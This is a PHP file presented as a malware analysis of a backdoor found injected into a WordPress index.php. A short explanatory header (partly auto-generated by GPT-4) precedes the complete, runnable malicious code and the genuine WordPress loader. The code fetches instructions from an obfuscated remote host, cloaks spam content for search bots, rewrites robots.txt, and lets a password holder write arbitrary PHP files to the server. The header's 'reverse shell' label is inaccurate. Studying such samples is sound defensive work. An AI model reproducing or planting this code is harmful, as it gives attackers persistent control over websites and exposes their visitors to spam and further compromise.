<?php
/**
 * Malware Analysis date : 20230527
 * Author : Cedric Moris Kelly
 * 
 * 
 * Found in /index.php at the root of a Wordpress install.
 * 
 * The file is a backdoor, a reverse shell which load php actions from https?://rkgqvfgevpgrg.bayvarebhgre.klm domain
 * 
 * GPT4 auto generated explanation
* 
* 1. The script starts with the opening `<?php` tag.
* 2. It sets the time limit for script execution to 3600 seconds (1 hour) using `@set_time_limit(3600)`. This ensures that the script won't time out if it takes a long time to execute.
* 3. It disables the ability for the user to abort the script using `@ignore_user_abort(1)`. This ensures that the script continues to run even if the user closes the browser or terminates the request.
* 4. It assigns the URL-encoded string '%72%6B%71%76%66%67%65%76%70%67%72%67%2E%62%61%79%76%61%72%65%62%68%67%72%65%2E%6B%6C%6D' to the variable `$xmlname`.
* 5. The script defines a function `drequest_uri()` that retrieves the current request URI.
* 6. It checks if the current connection is using HTTPS or HTTP and sets the `$http` variable accordingly.
* 7. The script URL-encodes the current request URI and assigns it to the variable `$duri`.
* 8. It applies the `str_rot13` function and URL-decodes the value stored in `$xmlname` and assigns it to the variable `$goweb`.
* 9. The script defines a function `is_https()` to check if the connection is using HTTPS.
* 10. It retrieves the value of the `HTTP_HOST` and `HTTP_ACCEPT_LANGUAGE` headers and assigns them to the variables `$host` and `$lang`, respectively. The value of `$lang` is then URL-encoded.
* 11. It checks if the `HTTP_REFERER` header is set and assigns its value to the variable `$urlshang`, which is also URL-encoded.
* 12. It computes the SHA-1 hash of the SHA-1 hash of the `pd` query parameter (if present) and assigns it to the variable `$password`.
* 13. If the computed `$password` matches the value 'f75fd5acd36a7fbd1e219b19881a5348bfc66e79', the script performs various actions based on the `mapname` and `action` query parameters.
* 14. The script defines a function `ping_sitemap($url)` that pings the provided URLs and returns the response.
* 15. It defines a function `disbot()` that checks if the current user agent is a search engine bot.
* 16. The script defines a function `doutdo($url)` that makes an HTTP request to the specified URL using cURL if available, or falls back to `file_get_contents` if cURL is not available.
* 17. It constructs a URL `$web` with various query parameters.
* 18. The script retrieves the content from the URL `$web` using the `doutdo` function and assigns it to the variable `$html_content`.
* 19. It checks the content of `$html_content` for specific strings and performs different actions based on the matching conditions.
* 20. The script ends with the closing `?>` tag and is immediately followed by another `<?php` tag, which starts a new PHP block.
* 
**/
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = '%72%6B%71%76%66%67%65%76%70%67%72%67%2E%62%61%79%76%61%72%65%62%68%67%72%65%2E%6B%6C%6D';//rkgqvfgevpgrg.bayvarebhgre.klm




$http_web = 'http';
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$duri_tmp = drequest_uri();
if ($duri_tmp == ''){
    $duri_tmp = '/';
}
$duri = urlencode($duri_tmp);
function drequest_uri()
{
    if (isset($_SERVER['REQUEST_URI'])) {
        $duri = $_SERVER['REQUEST_URI'];
    } else {
        if (isset($_SERVER['argv'])) {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        } else {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $duri;
}

$goweb = str_rot13(urldecode($xmlname));
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$host = $_SERVER['HTTP_HOST'];
$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = urlencode($lang);
$urlshang = '';
if (isset($_SERVER['HTTP_REFERER'])) {
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = urlencode($urlshang);
}
$password = sha1(sha1(@$_GET['pd']));
if ($password == 'f75fd5acd36a7fbd1e219b19881a5348bfc66e79') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $path = $_SERVER['DOCUMENT_ROOT'];
    } else {
        $path = dirname(__FILE__);
    }
    if (!$action) {
        $action = 'put';
    }
    if ($action == 'put') {
        if (strstr($add_content, '.xml')) {
            $map_path = $path. '/sitemap.xml';
            if (is_file($map_path)) {
                @unlink($map_path);
            }
            $file_path = $path . '/robots.txt';
            if (file_exists($file_path)) {
                $data = doutdo($file_path);
            } else {
                $data = 'User-agent: *
Allow: /';
            }
            $sitmap_url = $http . '://' . $host . '/' . $add_content;
            if (stristr($data, $sitmap_url)) {
                echo '<br>sitemap already added!<br>';
            } else {
                if (file_put_contents($file_path, trim($data) . "\r\n" . 'Sitemap: '.$sitmap_url)) {
                    echo '<br>ok<br>';
                } else {
                    echo '<br>file write false!<br>';
                }
            }
        } else {
            echo '<br>sitemap name false!<br>';
        }
        if (strstr($add_content, '.p' . 'hp')) {
            $a = sha1(sha1(@$_GET['a']));
            $b = sha1(sha1(@$_GET['b']));
            if ($a == doutdo($http_web . '://' . $goweb . '/a.p' . 'hp') || $b == 'f8f0dae804368c0334e22d9dcb70d3c7bbfa9635') {
                $dstr = @$_GET['dstr'];
                if (file_put_contents($path . '/' . $add_content, $dstr)) {
                    echo 'ok';
                }
            }
        }
    }
    exit;
}
function ping_sitemap($url){
    $url_arr = explode("\r\n", trim($url));
    $return_str = '';
    foreach($url_arr as $pingUrl){
        $pingRes = doutdo($pingUrl);
        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
        $return_str .= $pingUrl . '-- ' . $ok . '<br>';
    }
    return $return_str;
}
function disbot()
{
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
        return true;
    } else {
        return false;
    }
}
function doutdo($url)
{
    $file_contents= '';
    if(function_exists('curl_init')){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    if (!$file_contents) {
        $file_contents = @file_get_contents($url);
    }
    return $file_contents;
}
$web = $http_web . '://' . $goweb . '/indexnew.php?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang;
$html_content = trim(doutdo($web));
if (!strstr($html_content, 'nobotuseragent')) {
    if (strstr($html_content, 'okhtmlgetcontent')) {
        @header("Content-type: text/html; charset=utf-8");
        $html_content = str_replace("okhtmlgetcontent", '', $html_content);
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'okxmlgetcontent')){
        $html_content = str_replace("okxmlgetcontent", '', $html_content);
        @header("Content-type: text/xml");
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'pingxmlgetcontent')){
        $html_content = str_replace("pingxmlgetcontent", '', $html_content);
        @header("Content-type: text/html; charset=utf-8");
        echo ping_sitemap($html_content);
        exit();
    }else if (strstr($html_content, 'getcontent500page')) {
        @header('HTTP/1.1 500 Internal Server Error');
        exit();
    }else if (strstr($html_content, 'getcontent404page')) {
        @header('HTTP/1.1 404 Not Found');
        exit();
    }else if (strstr($html_content, 'getcontent301page')) {
        @header('HTTP/1.1 301 Moved Permanently');
        $html_content = str_replace("getcontent301page", '', $html_content);
        header('Location: ' . $html_content);
        exit();
    }
}/* blog T168 */ ?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';